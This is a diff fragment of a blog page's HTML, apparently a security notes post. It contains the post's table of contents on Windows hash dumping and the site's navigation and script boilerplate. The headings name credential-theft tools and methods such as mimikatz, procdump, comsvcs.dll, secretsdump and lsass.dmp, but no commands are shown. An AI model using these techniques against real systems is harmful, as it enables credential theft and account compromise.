+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Hash-Dumping"><span class="nav-number">1.</span> <span class="nav-text">Hash Dumping</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mimikatz"><span class="nav-number">1.1.</span> <span class="nav-text">mimikatz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#procdump"><span class="nav-number">1.2.</span> <span class="nav-text">procdump</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#comsvcs-dll"><span class="nav-number">1.3.</span> <span class="nav-text">comsvcs.dll</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#executes-mimikatz-xml"><span class="nav-number">1.4.</span> <span class="nav-text">executes mimikatz.xml</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#From-SAM"><span class="nav-number">1.5.</span> <span class="nav-text">From SAM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#avdump"><span class="nav-number">1.6.</span> <span class="nav-text">avdump</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rdrleakdiag"><span class="nav-number">1.7.</span> <span class="nav-text">rdrleakdiag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DiskShadow"><span class="nav-number">1.8.</span> <span class="nav-text">DiskShadow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pypykatz"><span class="nav-number">1.9.</span> <span class="nav-text">pypykatz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#secretsdump"><span class="nav-number">1.10.</span> <span class="nav-text">secretsdump</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqldumper"><span class="nav-number">1.11.</span> <span class="nav-text">sqldumper</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-Credential-Editor-WCE"><span class="nav-number">1.12.</span> <span class="nav-text">Windows Credential Editor (WCE)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lsassy"><span class="nav-number">1.13.</span> <span class="nav-text">lsassy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Powershell"><span class="nav-number">1.14.</span> <span class="nav-text">Powershell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lsass-dmp"><span class="nav-number">1.15.</span> <span class="nav-text">lsass.dmp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">2.</span> <span class="nav-text">Reference</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
